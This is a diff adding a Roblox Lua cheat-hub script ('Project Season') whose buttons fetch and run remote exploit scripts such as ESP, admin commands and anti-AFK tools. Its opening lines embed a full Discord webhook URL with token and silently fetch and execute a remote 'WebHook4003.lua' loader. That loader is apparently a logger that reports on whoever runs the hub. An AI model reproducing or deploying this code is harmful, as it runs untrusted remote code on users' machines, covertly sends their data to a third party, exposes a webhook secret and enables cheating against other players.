@@ -1,0 +1,151 @@
+getgenv().WebhookHere = "https://discord.com/api/webhooks/1035608061408186399/MbD_IOHiF5Xuziz2XyWw8rj1L_tze7oyVRATm-kcAwWKbOwrxk08oAdT8cpknlvGcASd"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+
+
+
+local Window = Rayfield:CreateWindow({
+	Name = "Project Season",
+	LoadingTitle = "Project Season, Best Hub available",
+	LoadingSubtitle = "by SEASONAL",
+	ConfigurationSaving = {
+		Enabled = false,
+		FolderName = Config, -- Create a custom folder for your hub/game
+		FileName = "Project Season"
+	},
+        Discord = {
+        	Enabled = true,
+        	Invite = "AwPwYu2Dcj", -- The Discord invite code, do not include discord.gg/
+        	RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+        },
+	KeySystem = true, -- Set this to true to use our key system
+	KeySettings = {
+		Title = "Project Season",
+		Subtitle = "Key System",
+		Note = "Join the discord for key",
+		FileName = "Key",
+		SaveKey = true,
+		GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+		Key = "https://pastebin.com/raw/1hw7KGF8"
+	}
+})
+
+
+
+    -----Main Scripts-----
+
+    local Tab = Window:CreateTab("Scripts")
+    local Section = Tab:CreateSection("Scripts")
+
+    -----
+
+    local Paragraph = Tab:CreateParagraph({Title = "Scripts", Content = "These scripts are NOT made by me so do not ask me if their are issue with their script but if there is a problem with my hub please notify me so i can get on the issue and fix it."})
+
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "Vestra",
+        Callback = function()
+            Rayfield:Notify("Loaded", "Vestra has been loaded", 9649923610) -- Title, Content, Image
+            getgenv().key = "Vstra.V5_7d9493b856e2d266"loadstring(game:HttpGet("https://raw.githubusercontent.com/xandudiscord/vestra/main/loader.lua"))()--discord for key (updates every 2 days)--https://discord.gg/fgDwFzmJZu
+        end,
+    })
+
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "StrawHook",
+        Callback = function()
+            Rayfield:Notify("Loaded", "StrawHook has been loaded", 9649923610) -- Title, Content, Image
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidMasterX/strawhook/main/script.lua", true))()
+        end,
+    })
+
+
+
+    -----Universal Scripts-----
+
+    local Tab = Window:CreateTab("Universal Scripts")
+    local Section = Tab:CreateSection("Scripts")
+    
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "Internal UI",
+        Callback = function()
+            Rayfield:Notify("Loaded", "Internal UI has been loaded", 9649923610) -- Title, Content, Image
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/zzerexx/scripts/main/Internal_UI.lua", "Internal UI"))()
+        end,
+    })
+
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "Universal ESP",
+        Callback = function()
+            Rayfield:Notify("Loaded", "Universal ESP loaded", 9649923610 )  -- Title, Content, Image
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/zzerexx/scripts/main/UniversalEspUI.lua", "UniversalEspUI"))()
+        end,
+    })
+
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "Orca",
+        Callback = function()
+            Rayfield:Notify("Script Loaded", "Loaded")
+            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()
+        end,
+    })
+
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "Fates Admin",
+        Callback = function()
+            Rayfield:Notify("Script Loaded", "Loaded")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+        end,
+    })
+
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "DomainX",
+        Callback = function()
+            Rayfield:Notify("Script Loaded", "Loaded")
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))()
+        end,
+    })
+
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "Infinity Yiff",
+        Callback = function()
+            Rayfield:Notify("Script Loaded", "Loaded")
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+        end,
+    })
+
+    -----
+    
+    local Button = Tab:CreateButton({
+        Name = "Anti Afk",
+        Callback = function()
+            Rayfield:Notify("Script Loaded", "Loaded")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
+        end,
+    })
+
+    -----
+
+    local Button = Tab:CreateButton({
+        Name = "Fates ESP",
+        Callback = function()
+            Rayfield:Notify("Script Loaded", "Loaded")
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-esp/main/main.lua"))();
+        end,
+    })
